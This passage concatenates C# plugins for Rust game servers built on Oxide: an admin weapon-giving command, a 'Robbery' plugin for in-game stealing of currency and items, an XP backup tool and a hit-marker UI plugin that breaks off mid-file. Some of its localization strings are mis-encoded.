        void GiveWeapon(ConsoleSystem.Arg args)
        {
            if (args.Connection.player != null) 
            { 
                BasePlayer p = args.Connection.player as BasePlayer;
                if (!p.IsAdmin) { return; }
            }
            if (args.Args.Count() < 2) { return; }

            List<string> argg = args.Args.ToList();
            BasePlayer target = BasePlayer.Find(argg[0]);
            int index = weaponsKeys.FindIndex(x => x == argg[1]);
            if (index.Equals(-1)) { return; }

            Item itemToGive = ItemManager.Create(ItemManager.FindItemDefinition(cfg.weapons.Values.ToList()[index].shortname), 1);
            itemToGive.name = weaponsVal.ToList()[index].name;
            target?.inventory.GiveItem(itemToGive);
            ChangeItemSkin(itemToGive, weaponsVal.ToList()[index].skin);
        }
        #endregion
    }
}

// --- End of file: kryIncreaseWeapons.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/Robbery.cs ---
// --- Original Local Path: Robbery.cs ---

using System;
using System.Collections.Generic;
using UnityEngine;
using Oxide.Core;
using Oxide.Core.Plugins;

namespace Oxide.Plugins
{
    [Info("Robbery", "Wulf/lukespragg", "4.0.1", ResourceId = 736)]
    [Description("Players can steal money, points, and/or items from other players")]

    class Robbery : RustPlugin
    {
        #region Initialization

        [PluginReference] Plugin Clans;
        [PluginReference] Plugin Economics;
        [PluginReference] Plugin EventManager;
        [PluginReference] Plugin Factions;
        [PluginReference] Plugin Friends;
        [PluginReference] Plugin RustIO;
        [PluginReference] Plugin ServerRewards;
        [PluginReference] Plugin UEconomics;
        [PluginReference] Plugin ZoneManager;

        readonly Hash<string, float> cooldowns = new Hash<string, float>();

        const string permKilling = "robbery.killing";
        const string permMugging = "robbery.mugging";
        const string permPickpocket = "robbery.pickpocket";
        const string permProtection = "robbery.protection";

        bool clanProtection;
        bool friendProtection;
        bool itemStealing;
        bool moneyStealing;
        bool pointStealing;

        float percentAwake;
        float percentSleeping;
        int usageCooldown;

        protected override void LoadDefaultConfig()
        {
            // Options
            Config["Clan Protection (true/false)"] = clanProtection = GetConfig("Clan Protection (true/false)", true);
            Config["Friend Protection (true/false)"] = friendProtection = GetConfig("Friend Protection (true/false)", true);
            Config["Item Stealing (true/false)"] = itemStealing = GetConfig("Item Stealing (true/false)", true);
            Config["Money Stealing (true/false)"] = moneyStealing = GetConfig("Money Stealing (true/false)", true);
            Config["Point Stealing (true/false)"] = pointStealing = GetConfig("Point Stealing (true/false)", true);

            // Settings
            Config["Cooldown (Seconds, 0 to Disable)"] = usageCooldown = GetConfig("Cooldown (Seconds, 0 to Disable)", 30);
            Config["Percent from Awake (0 - 100)"] = percentAwake = GetConfig("Percent from Awake (0 - 100)", 25f);
            Config["Percent from Sleeping (0 - 100)"] = percentSleeping = GetConfig("Percent from Sleeping (0 - 100)", 50f);

            // Cleanup
            Config.Remove("ClanProtection");
            Config.Remove("FriendProtection");
            Config.Remove("ItemStealing");
            Config.Remove("MoneyStealing");
            Config.Remove("PercentAwake");
            Config.Remove("PercentSleeping");
            Config.Remove("PointStealing");
            Config.Remove("UsageCooldown");

            SaveConfig();
        }
        void Init()
        {
            LoadDefaultConfig();
            LoadDefaultMessages();

            permission.RegisterPermission(permKilling, this);
            permission.RegisterPermission(permMugging, this);
            permission.RegisterPermission(permPickpocket, this);
            permission.RegisterPermission(permProtection, this);
        }

        #endregion

        #region Localization

        void LoadDefaultMessages()
        {
            // English
            lang.RegisterMessages(new Dictionary<string, string>
            {
                ["CanBeSeen"] = "You can't pickpocket right now, you were seen",
                ["CantHoldItem"] = "You can't pickpocket while holding an item",
                ["Cooldown"] = "Wait a bit before attempting to steal again",
                ["IsClanmate"] = "You can't steal from a clanmate",
                ["IsFriend"] = "You can't steal from a friend",
                ["IsProtected"] = "You can't steal from a protected player",
                ["NoLootZone"] = "You can't steal from players in this zone",
                ["StoleItem"] = "You stole {0} {1} from {2}!",
                ["StoleMoney"] = "You stole ${0} from {1}!",
                ["StoleNothing"] = "You stole pocket lint from {0}!",
                ["StolePoints"] = "You stole {0} points from {1}!"
            }, this);

            // French
            lang.RegisterMessages(new Dictionary<string, string>
            {
                ["CanBeSeen"] = "Vous ne pouvez pas pickpocket, dÃ¨s maintenant, vous ont Ã©tÃ© vus",
                ["CantHoldItem"] = "Vous ne pouvez pas pickpocket tout en maintenant un Ã©lÃ©ment",
                ["Cooldown"] = "Attendre un peu avant de tenter de voler Ã  nouveau",
                ["IsClanmate"] = "Ce joueur est dans votre clan, vous ne pouvez pas lui voler",
                ["IsFriend"] = "Ce joueur est votre ami, vous ne pouvez pas lui voler",
                ["IsProtected"] = "Ce joueur est protectÃ©, vous ne pouvez pas lui voler",
                ["NoLootZone"] = "Vous ne pouvez pas voler dans cette zone",
                ["StoleItem"] = "Vous avez volÃ© {0} {1} de {2}!",
                ["StoleMoney"] = "Vous avez volÃ© â¬{0} de {1} !",
                ["StoleNothing"] = "Vouz n'avez pas volÃ© rien de {0} !",
                ["StolePoints"] = "Vous avez volÃ© {0} points de {1} !"
            }, this, "fr");

            // German
            lang.RegisterMessages(new Dictionary<string, string>
            {
                ["CanBeSeen"] = "Sie kÃ¶nnen nicht Taschendieb schon jetzt, Sie wurden gesehen",
                ["CantHoldItem"] = "Du kannst nicht Taschendieb beim Halten eines Elements",
                ["Cooldown"] = "Noch ein bisschen warten Sie, bevor Sie versuchen, wieder zu stehlen",
                ["IsClanmate"] = "Sie kÃ¶nnen nicht von einem Clan-Mate stehlen",
                ["IsFriend"] = "Sie kÃ¶nnen nicht von einem Freund stehlen",
                ["IsProtected"] = "Sie kÃ¶nnen nicht von einem geschÃ¼tzten Spieler stehlen",
                ["NoLootZone"] = "Sie kÃ¶nnen von Spielern in dieser Zone nicht stehlen",
                ["StoleItem"] = "Sie hablen {0} {1} von {2} gestohlen!",
                ["StoleMoney"] = "Sie haben â¬{0} von {1} gestohlen!",
                ["StoleNothing"] = "Sie haben nichts von {0} gestohlen!",
                ["StolePoints"] = "Sie haben {0} Punkte von {1} gestohlen!"
            }, this, "de");

            // Russian
            lang.RegisterMessages(new Dictionary<string, string>
            {
                ["CanBeSeen"] = "ÐÑ Ð½Ðµ Ð¼Ð¾Ð¶ÐµÑÐµ ÐºÐ°ÑÐ¼Ð°Ð½Ð½Ð¸Ðº Ð¿ÑÑÐ¼Ð¾ ÑÐµÐ¹ÑÐ°Ñ, Ð²Ñ Ð±ÑÐ»Ð¸ Ð·Ð°Ð¼ÐµÑÐµÐ½Ñ",
                ["CantHoldItem"] = "ÐÑ Ð½Ðµ Ð¼Ð¾Ð¶ÐµÑÐµ ÐºÐ°ÑÐ¼Ð°Ð½Ð½Ð¸Ðº ÑÐ´ÐµÑÐ¶Ð¸Ð²Ð°Ñ ÑÐ»ÐµÐ¼ÐµÐ½Ñ",
                ["Cooldown"] = "ÐÐ¾Ð´Ð¾Ð¶Ð´Ð¸ÑÐµ Ð½ÐµÐ¼Ð½Ð¾Ð³Ð¾, Ð¿ÑÐµÐ¶Ð´Ðµ ÑÐµÐ¼ ÑÐ½Ð¾Ð²Ð° ÑÐºÑÐ°ÑÑÑ",
                ["IsClanmate"] = "ÐÑ Ð½Ðµ Ð¼Ð¾Ð¶ÐµÑÐµ ÑÐºÑÐ°ÑÑÑ Ð¸Ð· ÐºÐ»Ð°Ð½Ð° Ð¼Ð°Ñ",
                ["IsFriend"] = "ÐÑ Ð½Ðµ Ð¼Ð¾Ð¶ÐµÑÐµ ÑÐºÑÐ°ÑÑÑ Ð¾Ñ Ð´ÑÑÐ³Ð°",
                ["IsProtected"] = "ÐÑ Ð½Ðµ Ð¼Ð¾Ð¶ÐµÑÐµ ÑÐºÑÐ°ÑÑÑ Ð¸Ð· Ð·Ð°ÑÐ¸ÑÐµÐ½Ð½Ð¾Ð³Ð¾ Ð¿Ð»ÐµÐµÑÐ°.",
                ["NoLootZone"] = "ÐÑ Ð½Ðµ Ð¼Ð¾Ð¶ÐµÑÐµ ÑÐºÑÐ°ÑÑÑ Ñ Ð¸Ð³ÑÐ¾ÐºÐ¾Ð² Ð² ÑÑÐ¾Ð¹ Ð·Ð¾Ð½Ðµ",
                ["StoleItem"] = "ÐÑ ÑÐºÑÐ°Ð»Ð¸ {0} {1} Ð¸Ð· {2}!",
                ["StoleMoney"] = "ÐÑ ÑÐºÑÐ°Ð»Ð¸ â½{0} Ð¸Ð· {1}!",
                ["StoleNothing"] = "ÐÑ ÑÐºÑÐ°Ð»Ð¸ Ð½Ð¸ÑÐµÐ³Ð¾ Ð¾Ñ {0}!",
                ["StolePoints"] = "ÐÑ ÑÐºÑÐ°Ð»Ð¸ {0} ÑÐ¾ÑÐµÐº Ñ {1}!"
            }, this, "ru");

            // Spanish
            lang.RegisterMessages(new Dictionary<string, string>
            {
                ["CanBeSeen"] = "No se puede robar ahora, fueron vistos",
                ["CantHoldItem"] = "No a carterista manteniendo un elemento",
                ["Cooldown"] = "Esperar un poco antes de intentar robar otra vez",
                ["IsClanmate"] = "Esto jugador estÃ¡ en tu clan, no puedes robarle",
                ["IsFriend"] = "Esto jugador estÃ¡ tu amigo, no puedes robarle",
                ["IsProtected"] = "Esto jugador estÃ¡ protegido, no puedes robarle",
                ["NoLootZone"] = "No puedes robar nadie en esta zona",
                ["StoleItem"] = "Has robado {0} {1} de {2}!",
                ["StoleMoney"] = "Has robado ${0} de {1}!",
                ["StoleNothing"] = "No has robado nada de {0}!",
                ["StolePoints"] = "Has robado {0} puntos de {1}!"
            }, this, "es");
        }

        #endregion

        #region Point Stealing

        void StealPoints(BasePlayer victim, BasePlayer attacker)
        {
            // ServerRewards plugin support - http://oxidemod.org/plugins/serverrewards.1751/
            if (ServerRewards)
            {
                var balance = ServerRewards.Call("CheckPoints", victim.userID) ?? 0;
                var points = victim.IsSleeping() ? (int)Math.Floor((int)balance * (percentSleeping / 100)) : (int)Math.Floor((int)balance * (percentAwake / 100));

                if (points > 0)
                {
                    ServerRewards.Call("TakePoints", victim.userID, points);
                    ServerRewards.Call("AddPoints", attacker.userID, points);
                    PrintToChat(attacker, Lang("StolePoints", attacker.UserIDString, points, victim.displayName));
                }
                else
                    PrintToChat(attacker, Lang("StoleNothing", attacker.UserIDString, victim.displayName));
            }
        }

        #endregion

        #region Money Stealing

        void StealMoney(BasePlayer victim, BasePlayer attacker)
        {
            // Economics plugin support - http://oxidemod.org/plugins/economics.717/
            if (Economics)
            {
                var balance = (double)Economics.Call("GetPlayerMoney", victim.userID);
                var money = victim.IsSleeping() ? Math.Floor(balance * (percentSleeping / 100)) : Math.Floor(balance * (percentAwake / 100));

                if (money > 0)
                {
                    Economics.Call("Transfer", victim.userID, attacker.userID, money);
                    PrintToChat(attacker, Lang("StoleMoney", attacker.UserIDString, money, victim.displayName));
                }
                else
                    PrintToChat(attacker, Lang("StoleNothing", attacker.UserIDString, victim.displayName));
            }

            // UEconomics plugin support - http://oxidemod.org/plugins/ueconomics.2129/
            if (UEconomics)
            {
                var balance = (int)UEconomics.Call("GetPlayerMoney", victim.UserIDString);
                var money = victim.IsSleeping() ? Math.Floor(balance * (percentSleeping / 100)) : Math.Floor(balance * (percentAwake / 100));

                if (money > 0)
                {
                    UEconomics.Call("Withdraw", victim.UserIDString, money);
                    UEconomics.Call("Deposit", attacker.UserIDString, money);
                    PrintToChat(attacker, Lang("StoleMoney", attacker.UserIDString, money, victim.displayName));
                }
                else
                    PrintToChat(attacker, Lang("StoleNothing", attacker.UserIDString, victim.displayName));
            }
        }

        #endregion

        #region Item Stealing

        void StealItem(BasePlayer victim, BasePlayer attacker)
        {
            var victimInv = victim.inventory.containerMain;
            var attackerInv = attacker.inventory.containerMain;
            if (victimInv == null || attackerInv == null) return;

            var item = victimInv.GetSlot(UnityEngine.Random.Range(1, victimInv.capacity));
            if (item != null && !attackerInv.IsFull())
            {
                item.MoveToContainer(attackerInv);
                PrintToChat(attacker, Lang("StoleItem", attacker.UserIDString, item.amount, item.info.displayName.english, victim.displayName));
            }
            else
                PrintToChat(attacker, Lang("StoleNothing", attacker.UserIDString, victim.displayName));
        }

        #endregion

        #region Zone Checks

        bool InNoLootZone(BasePlayer victim, BasePlayer attacker)
        {
            // Event Manager plugin support - http://oxidemod.org/plugins/event-manager.740/
            if (EventManager)
            {
                if (!((bool)EventManager.Call("isPlaying", victim))) return false;
                PrintToChat(attacker, Lang("NoLootZone", attacker.UserIDString));
                return true;
            }

            // Zone Manager plugin support - http://oxidemod.org/plugins/zones-manager.739/
            if (ZoneManager)
            {
                var noLooting = Enum.Parse(ZoneManager.GetType().GetNestedType("ZoneFlags"), "NoPlayerLoot", true);
                if (!((bool)ZoneManager.Call("HasPlayerFlag", victim, noLooting))) return false;
                PrintToChat(attacker, Lang("NoLootZone", attacker.UserIDString));
                return true;
            }

            return false;
        }

        #endregion

        #region Friend Checks

        bool IsFriend(BasePlayer victim, BasePlayer attacker)
        {
            // Friends plugin support - http://oxidemod.org/plugins/friends-api.686/
            if (friendProtection && Friends)
            {
                // Check if victim is friend of attacker
                if (!((bool)Friends.Call("AreFriends", attacker.userID, victim.userID))) return false;
                PrintToChat(attacker, Lang("IsFriend", attacker.UserIDString));
                return true;
            }

            // Rust:IO plugin support - http://oxidemod.org/extensions/rust-io.768/
            if (friendProtection && RustIO)
            {
                // Check if victim is friend of attacker
                if (!((bool)RustIO.Call("HasFriend", attacker.UserIDString, victim.UserIDString))) return false;
                PrintToChat(attacker, Lang("IsFriend", attacker.UserIDString));
                return true;
            }

            return false;
        }

        #endregion

        #region Clan Checks

        bool IsClanmate(BasePlayer victim, BasePlayer attacker)
        {
            // Clans plugin support - http://oxidemod.org/plugins/rust-io-clans.842/
            if (clanProtection && Clans)
            {
                var victimClan = (string)Clans.Call("GetClanOf", victim.UserIDString);
                var attackerClan = (string)Clans.Call("GetClanOf", attacker.UserIDString);
                if (victimClan == null || attackerClan == null || !victimClan.Equals(attackerClan)) return false;
                PrintToChat(attacker, Lang("IsClanmate", attacker.UserIDString));
                return true;
            }

            // Factions plugin support - http://oxidemod.org/plugins/factions.1919/
            if (clanProtection && Factions)
            {
                if (!((bool)Factions.Call("CheckSameFaction", attacker.userID, victim.userID))) return false;
                PrintToChat(attacker, Lang("IsClanmate", attacker.UserIDString));
                return true;
            }

            return false;
        }

        #endregion

        #region Killing

        void OnEntityDeath(BaseEntity entity, HitInfo info)
        {
            var victim = entity as BasePlayer;
            var attacker = info?.Initiator as BasePlayer;
            if (victim == null || attacker == null) return;
            if (victim == attacker) return;

            if (!permission.UserHasPermission(attacker.UserIDString, permKilling)) return;
            if (permission.UserHasPermission(victim.UserIDString, permProtection)) return;
            if (InNoLootZone(victim, attacker) || IsFriend(victim, attacker) || IsClanmate(victim, attacker)) return;

            if (moneyStealing) StealMoney(victim, attacker);
            if (pointStealing) StealPoints(victim, attacker);
        }

        #endregion

        #region Mugging

        void OnEntityTakeDamage(BaseEntity entity, HitInfo info)
        {
            var victim = entity?.ToPlayer();
            var attacker = info?.Initiator?.ToPlayer();
            if (victim == null || attacker == null) return;
            if (victim == attacker) return;

            if (info.IsProjectile()) return;

            if (!permission.UserHasPermission(attacker.UserIDString, permMugging)) return;
            if (permission.UserHasPermission(victim.UserIDString, permProtection)) return;
            if (InNoLootZone(victim, attacker) || IsFriend(victim, attacker) || IsClanmate(victim, attacker)) return;

            if (!cooldowns.ContainsKey(attacker.UserIDString)) cooldowns.Add(attacker.UserIDString, 0f);
            if (usageCooldown != 0 && cooldowns[attacker.UserIDString] + usageCooldown > Interface.Oxide.Now)
            {
                PrintToChat(attacker, Lang("Cooldown", attacker.UserIDString));
                return;
            }

            if (itemStealing) StealItem(victim, attacker);
            if (moneyStealing) StealMoney(victim, attacker);
            if (pointStealing) StealPoints(victim, attacker);

            cooldowns[attacker.UserIDString] = Interface.Oxide.Now;
        }

        #endregion

        #region Pickpocketing

        void OnPlayerInput(BasePlayer attacker, InputState input)
        {
            if (!input.WasJustPressed(BUTTON.USE)) return;
            if (!permission.UserHasPermission(attacker.UserIDString, permPickpocket)) return;

            var ray = new Ray(attacker.eyes.position, attacker.eyes.HeadForward());
            var entity = FindObject(ray, 1);
            var victim = entity?.ToPlayer();
            if (victim == null) return;

            if (permission.UserHasPermission(victim.UserIDString, permProtection)) return;
            if (InNoLootZone(victim, attacker) || IsFriend(victim, attacker) || IsClanmate(victim, attacker)) return;

            var victimToAttacker = (attacker.transform.position - victim.transform.position).normalized;
            if (Vector3.Dot(victimToAttacker, victim.eyes.HeadForward().normalized) > 0)
            {
                PrintToChat(attacker, Lang("CanBeSeen", attacker.UserIDString));
                return;
            }

            if (attacker.GetActiveItem()?.GetHeldEntity() != null)
            {
                PrintToChat(attacker, Lang("CantHoldItem", attacker.UserIDString));
                return;
            }

            if (!cooldowns.ContainsKey(attacker.UserIDString)) cooldowns.Add(attacker.UserIDString, 0f);
            if (usageCooldown != 0 && cooldowns[attacker.UserIDString] + usageCooldown > Interface.Oxide.Now)
            {
                PrintToChat(attacker, Lang("Cooldown", attacker.UserIDString));
                return;
            }

            if (itemStealing) StealItem(victim, attacker);
            if (moneyStealing) StealMoney(victim, attacker);
            if (pointStealing) StealPoints(victim, attacker);

            cooldowns[attacker.UserIDString] = Interface.Oxide.Now;
        }

        #endregion

        #region Helpers

        T GetConfig<T>(string name, T value) => Config[name] == null ? value : (T)Convert.ChangeType(Config[name], typeof(T));

        string Lang(string key, string id = null, params object[] args) => string.Format(lang.GetMessage(key, this, id), args);

        static BaseEntity FindObject(Ray ray, float distance)
        {
            RaycastHit hit;
            return Physics.Raycast(ray, out hit, distance) ? hit.GetEntity() : null;
        }

        #endregion
    }
}


// --- End of file: Robbery.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/XPBackup.cs ---
// --- Original Local Path: XPBackup.cs ---

using System.Collections.Generic;
using Oxide.Core;
using System.Linq;
using Oxide.Core.Plugins;

namespace Oxide.Plugins
{
    [Info("XP Backup", "PaiN", "0.2", ResourceId = 2035)]
    class XPBackup : RustPlugin
    {

        [PluginReference]
        Plugin PvXselector;

        class Data { public List<XPInfo> xpinfo = new List<XPInfo>(); }
        static Data data;

        class XPInfo
        {
            public float Level;
            public float XP;
            public ulong steamId;
            public bool OnConnect;

            internal static XPInfo GetInfo(ulong Id) => data.xpinfo.Find(x => x.steamId == Id);
        }

        void Loaded()
        {
            LoadMessages();
            data = Interface.Oxide.DataFileSystem.ReadObject<Data>("XPBackup");
            permission.RegisterPermission("xpbackup.admin", this);
        }

        void OnServerSave() => SaveData();

        void LoadMessages()
        {
            Dictionary<string, string> messages = new Dictionary<string, string>
            {
                {"CMD_NO_PERMISSION", "You do not have permission to use this command!"},
                {"CMD_SAVEALL_SUCCESSFUL", "You have successfully saved everyone's Experience Information" },
                {"CMD_SAVE_SUCCESSFUL", "You have successfully saved {0}'s Experience Information" },
                {"CMD_SYNTAX", "Syntax: \"/xpb <save/remove/give> <player/all> <GiveOnConnect:true/false>\" (ex. /xpb save PaiN true)"},
                {"CMD_PLAYER_NOT_FOUND", "Player not found!" },
                {"CMD_NO_BACKUP", "There are no saved backups for this player." },
                {"CMD_REMOVE_SUCCESSFUL", "You have successfully removed {0}'s Experience Information." },
                {"CMD_REMOVEALL_SUCCESSFUL", "You have successfully removed everyone's Experience Information." },
                {"CMD_GIVE_SUCCESSFUL", "You have successfully given {0}'s Experience Information back." },
                {"CMD_GIVEALL_SUCCESSFUL", "You have successfully given everyone's Experience Information back." },
                {"CONNECT_GIVE_XP", "You have been given your saved XP"}

            };
            lang.RegisterMessages(messages, this);
        }

        void OnPlayerInit(BasePlayer player)
        {
            if (XPInfo.GetInfo(player.userID) != null && XPInfo.GetInfo(player.userID).OnConnect)
            {
                ResetAndAdd(player);
                data.xpinfo.Remove(XPInfo.GetInfo(player.userID));
                player?.ChatMessage(LangMsg("CONNECT_GIVE_XP", player.userID));
            }
        }

        [ChatCommand("xpb")]
        void cmdBackup(BasePlayer player, string cmd, string[] args)
        {
            if (!permission.UserHasPermission(player.UserIDString, "xpbackup.admin"))
            {
                player.ChatMessage(LangMsg("CMD_NO_PERMISSION", player.userID));
                return;
            }
            if (args.Length == 0)
            {
                player.ChatMessage(LangMsg("CMD_SYNTAX", player.userID));
                return;
            }

            BasePlayer target = BasePlayer.Find(args[1]);
            XPInfo pinfo = XPInfo.GetInfo(target?.userID ?? 0);

            switch (args[0])
            {
                case "save":
                    if (args.Length != 3)
                    {
                        player.ChatMessage(LangMsg("CMD_SYNTAX", player.userID));
                        return;
                    }

                    bool result;

                    if (!bool.TryParse(args[2], out result))
                    {
                        player.ChatMessage(LangMsg("CMD_SYNTAX", player.userID));
                        return;
                    }

                    if (args[1] == "all")
                    {
                        data.xpinfo.Clear();
                        foreach (var current in covalence.Players.GetAllPlayers())
                        {
                            ulong currId = System.Convert.ToUInt64(current.Id);

                            if (XPInfo.GetInfo(currId) != null)
                                data.xpinfo.Remove(XPInfo.GetInfo(currId));

                            XPInfo info = new XPInfo()
                            {
                                Level = BasePlayer.FindXpAgent(currId).CurrentLevel,
                                steamId = currId,
                                XP = BasePlayer.FindXpAgent(currId).UnspentXp,
                                OnConnect = result
                            };
                            data.xpinfo.Add(info);
                        }
                        player.ChatMessage(LangMsg("CMD_SAVEALL_SUCCESSFUL", player.userID));
                    }
                    else
                    {
                        if (target == null)
                        {
                            player.ChatMessage(LangMsg("CMD_PLAYER_NOT_FOUND", player.userID));
                            return;
                        }

                        if (XPInfo.GetInfo(target.userID) != null)
                            data.xpinfo.Remove(pinfo);

                        XPInfo info = new XPInfo()
                        {
                            Level = BasePlayer.FindXpAgent(target.userID).CurrentLevel,
                            steamId = target.userID,
                            XP = BasePlayer.FindXpAgent(target.userID).UnspentXp,
                            OnConnect = result
                        };
                        data.xpinfo.Add(info);
                        player.ChatMessage(string.Format(LangMsg("CMD_SAVE_SUCCESSFUL", player.userID), target.displayName));
                    }
                    break;
                case "remove":
                    if (args[1] == "all")
                    {
                        data.xpinfo.Clear();
                        player.ChatMessage(LangMsg("CMD_REMOVEALL_SUCCESSFUL", player.userID));
                    }
                    else
                    {
                        if (target == null)
                        {
                            player.ChatMessage(LangMsg("CMD_PLAYER_NOT_FOUND", player.userID));
                            return;
                        }
                        if (pinfo == null)
                        {
                            player.ChatMessage(LangMsg("CMD_NO_BACKUP", player.userID));
                            return;
                        }
                        data.xpinfo.Remove(pinfo);
                        player.ChatMessage(string.Format(LangMsg("CMD_REMOVE_SUCCESSFUL", player.userID), target.displayName));
                    }
                    break;
                case "give":
                    if (args[1] == "all")
                    {
                        foreach (BasePlayer current in BasePlayer.activePlayerList)
                        {
                            if (data.xpinfo.Any(x => x.steamId == current.userID))
                            {
                                ResetAndAdd(current);
                                data.xpinfo.Remove(XPInfo.GetInfo(current.userID));
                            }
                        }
                        player.ChatMessage(LangMsg("CMD_GIVEALL_SUCCESSFUL", player.userID));
                    }
                    else
                    {
                        if (target == null)
                        {
                            player.ChatMessage(LangMsg("CMD_PLAYER_NOT_FOUND", player.userID));
                            return;
                        }
                        if (pinfo == null)
                        {
                            player.ChatMessage(LangMsg("CMD_NO_BACKUP", player.userID));
                            return;
                        }
                        ResetAndAdd(player);
                        data.xpinfo.Remove(pinfo);
                        player.ChatMessage(string.Format(LangMsg("CMD_GIVE_SUCCESSFUL", player.userID), target.displayName));
                    }
                    break;
            }
            SaveData();
        }

        void ResetAndAdd(BasePlayer player)
        {
            var xpagent = BasePlayer.FindXpAgent(player.userID);
            PvXselector?.Call("disablePvXLogger", player.userID);
            xpagent.Reset();
            xpagent.Add(Rust.Xp.Definitions.Cheat, Rust.Xp.Config.LevelToXp(System.Convert.ToInt32(XPInfo.GetInfo(player.userID).Level)));
            PvXselector?.Call("pvxUpdateXPDataFile", player);
            PvXselector?.Call("enablePvXLogger", player.userID);
        }

        void SaveData() => Interface.Oxide.DataFileSystem.WriteObject("XPBackup", data);
        string LangMsg(string msg, object uid) => lang.GetMessage(msg, this, uid == null ? null : uid.ToString());
    }
}


// --- End of file: XPBackup.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/HitAdvance.cs ---
// --- Original Local Path: HitAdvance.cs ---

﻿using System;
using System.Collections;
using System.Globalization;
using System.Linq;
using Newtonsoft.Json;
using Oxide.Core;
using Oxide.Game.Rust.Cui;
using UnityEngine;
using VLB;
using WebSocketSharp;

namespace Oxide.Plugins
{
    [Info("HitAdvance", "Hougan", "2.0.4")]
    [Description("Уникальный маркер для вашего сервера. Куплено на server-rust.RU")]
    public class HitAdvance : RustPlugin
    {
        #region eNums

        private enum HitType
        {
            None,
            Line,
            Text,
            LineAndText,
            Icon
        }

        #endregion
        
        #region Classes

        private class PlayerMarker : MonoBehaviour
        {
            public BasePlayer Player;
            
            public void Awake()
            {
                Player = GetComponent<BasePlayer>();
            }

            public void ShowHit(BaseEntity target, HitInfo info)
            {
                CuiElementContainer container = new CuiElementContainer();
                var obj = target.GetComponent<BaseCombatEntity>();
                if (obj == null) return;
                
                switch (GetSettings().CurrentType)
                {
                    case HitType.Line:
                    {
                        float curHealth = obj.health;
                        float maxHealth = obj._maxHealth;
                        if (target is BuildingBlock)
                        {
                            var curGrade = (target as BuildingBlock).currentGrade;
                            if (curGrade == null) return;

                            maxHealth = curGrade.maxHealth;
                        }

                        var color = GetGradientColor((int) curHealth, (int) maxHealth);
                        float decreaseLength = (180.5f + 199.5f) / 2f * (curHealth / maxHealth); 
                        
                        container.Add(new CuiPanel
                        {
                            FadeOut = 0.5f,
                            RectTransform = { AnchorMin = "0.5 0", AnchorMax = "0.5 0", OffsetMin = $"{-10 - decreaseLength} 80", OffsetMax = $"{-9 + decreaseLength} 85" },
                            Image         = { Color     = color }
                        }, "Hud", Layer); 
                        
                        DestroyHit();
                        CuiHelper.AddUi(Player, container);
                        
                        
                        if (IsInvoking(nameof(DestroyHit))) CancelInvoke(nameof(DestroyHit));
                        Invoke(nameof(DestroyHit), Settings.DestroyTime); 
                        break;
                    }
                    case HitType.Text:
                    {
                        var pos = GetRandomTextPosition();
                        float curHealth = obj.health;
                        float maxHealth = obj.MaxHealth();
                        string textDamage = info.damageTypes.Total().ToString("F0");
                        
                        if (Mathf.FloorToInt(info.damageTypes.Total()) == 0)
                            return;

                        float division = 1 - curHealth / maxHealth;
                        if (target is BasePlayer)
                        {
                            var targetPlayer = target as BasePlayer;
                            if (info.isHeadshot)
                                textDamage = $"<color=#DC143C>{textDamage}</color>";
                            if (targetPlayer.IsWounded())
                            {
                                textDamage = "<color=#DC143C>УПАЛ</color>";
                                if (info.isHeadshot)
                                    textDamage += " <color=#DC143C>ГОЛОВА</color>";
                            }
        
                            if (Player.currentTeam == targetPlayer.currentTeam && Player.currentTeam != 0)
                            {
                                textDamage = "<color=#32915a>ДРУГ</color>";
                                division = 1;
                            }
                        }


                        var hitId = CuiHelper.GetGuid();
                        container.Add(new CuiElement()
                        {
                            Name = hitId,
                            Parent = "Hud",
                            FadeOut = 0.5f,
                            Components =
                            {
                                new CuiTextComponent { Text = $"<b>{textDamage}</b>", Color = HexToRustFormat("#FFFFFFFF"), Font = "robotocondensed-bold.ttf", FontSize = (int) Mathf.Lerp(15, 30, division), Align = TextAnchor.MiddleCenter, },
                                new CuiOutlineComponent() {Color = "0 0 0 1", Distance = "0.155004182 0.15505041812"},
                                new CuiRectTransformComponent() { AnchorMin = $"{pos.x} {pos.y}", AnchorMax = $"{pos.x} {pos.y}", OffsetMin = "-100 -100", OffsetMax = "100 100" }
        
                            }
                        });
        
                        CuiHelper.AddUi(Player, container);
                        StartCoroutine(DestroyHit(hitId));
                        break;
                    }
                    case HitType.Icon:
                    {
                        var hitId = CuiHelper.GetGuid();

                        string color = "1 1 1 0.5";
                        string image = "assets/icons/close.png";
                        float margin = 10;
                        
                        if (target is BasePlayer)
                        {
                            var targetPlayer = target as BasePlayer;
                            if (targetPlayer.IsWounded())
                            {
                                margin = 20;
                                image = "assets/icons/fall.png";
                            }
                            if (targetPlayer.IsWounded() || targetPlayer.IsDead())
                                color = "1 0.2041845 0.204181 0.5";
                        }

                        if (info.isHeadshot) color = "1 0.2 0.2 0.5";

                        container.Add(new CuiButton
                        {
                            FadeOut = 0.3f,
                            RectTransform = {AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = $"-{margin} -{margin}", OffsetMax = $"{margin} {margin}"},
                            Button        = {Color     = color, Sprite = image },
                            Text          = {Text      = ""}
                        }, "Hud", hitId);
        
                        CuiHelper.AddUi(Player, container);
                        CuiHelper.DestroyUi(Player, hitId);
                        break;
                    }
                    case HitType.LineAndText:
                    {
                        GetSettings().CurrentType = HitType.Line;
                        ShowHit(target, info);
                        GetSettings().CurrentType = HitType.Text;
                        ShowHit(target, info);
                        GetSettings().CurrentType = HitType.LineAndText;
                        break;
                    }
                }

                
            }

            public const string Layer = "UI_HitAdvance_Layer";
            public void DestroyHit() => CuiHelper.DestroyUi(Player, Layer);
            public IEnumerator DestroyHit(string ID, float delay = 0.5f)
            {
                yield return new WaitForSeconds(delay);
                
                CuiHelper.DestroyUi(Player, ID);
            }
            public PlayerSettings GetSettings() => PlayerSettingses[Player.userID];
        }

        private class PlayerSettings
        {
            public HitType CurrentType;
            public bool BuildingHit;
            
            public PlayerSettings() {}
            public static PlayerSettings Generate()
            {
                return new PlayerSettings
                {
                    CurrentType = Settings.HitSettings.FirstOrDefault(p => p.Value.IsDefault).Key,
                    BuildingHit = Settings.DefaultBuildingDamage
                };
            }
        }

        private class HitSetting
        {
            [JsonProperty("Название маркера")]
            public string DisplayName;
            [JsonProperty("Разрешение, с которым его можно выбрать")]
            public string Permission;

            [JsonProperty("Включён у игроков изначально")]
            public bool IsDefault;
        }
        
        private class Configuration
        {
            [JsonProperty("Настройки различных маркеров")]
